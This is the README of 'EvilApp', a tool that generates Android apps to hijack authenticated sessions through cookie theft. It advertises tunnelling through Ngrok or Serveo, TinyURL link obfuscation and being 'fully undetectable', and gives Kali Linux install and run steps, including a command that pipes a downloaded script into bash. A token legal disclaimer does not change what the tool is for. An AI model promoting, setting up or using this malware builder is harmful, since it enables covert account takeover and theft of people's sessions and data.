# EvilApp v1.0
## Author: https://github.com/thelinuxchoice/EvilApp
## IG: https://www.instagram.com/linux_choice
### Don't copy this code without give me the credits, nerd! 

Script to generate Android App that can hijack autenticated sessions in cookies

![ea](https://user-images.githubusercontent.com/34893261/50353882-c6007a80-0530-11e9-81b0-9242e5c33ba7.png)

### Features:
#### 2 Port Forwarding options (Ngrok or using SSH Tunneling with Serveo.net)
#### Obfuscated URL by Tinyurl
#### Fully Undetectable

## Legal disclaimer:

Usage of EvilApp for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 

### Auto Install:

```
# bash install.sh
```

### Installing on Kali Linux:
```
Install dependencies:
# apt-get update
# apt-get install default-jdk apksigner

For x86:
# apt-get install libc6-dev-i386 lib32z1

For AMD64:
# apt-get install lib32z1 lib32ncurses6 lib32stdc++6

Download SDK-Tools:
# wget https://dl.google.com/android/repository/sdk-tools-linux-4333796.zip
#mkdir -p $HOME/Android/Sdk
# unzip sdk-tools-linux* -d $HOME/Android/Sdk

Install SDKMAN
# curl -s "https://get.sdkman.io" | bash
# source "$HOME/.sdkman/bin/sdkman-init.sh"
# echo "Y" | sdk install java 8.0.191-oracle
# sdk use java 8.0.191-oracle
# sdk install gradle 2.14.1
# sdk use gradle 2.14.1

# echo "y" | $HOME/Android/Sdk/tools/bin/sdkmanager "platforms;android-25" "build-tools;25.0.1" "extras;google;m2repository" "extras;android;m2repository"

# git clone https://github.com/thelinuxchoice/evilapp
# cd evilapp
# bash evilapp.sh
```

### Donate!
Support the authors:
### Paypal:
https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=CLKRT5QXXFJY4&source=url
### LiberaPay:
<noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
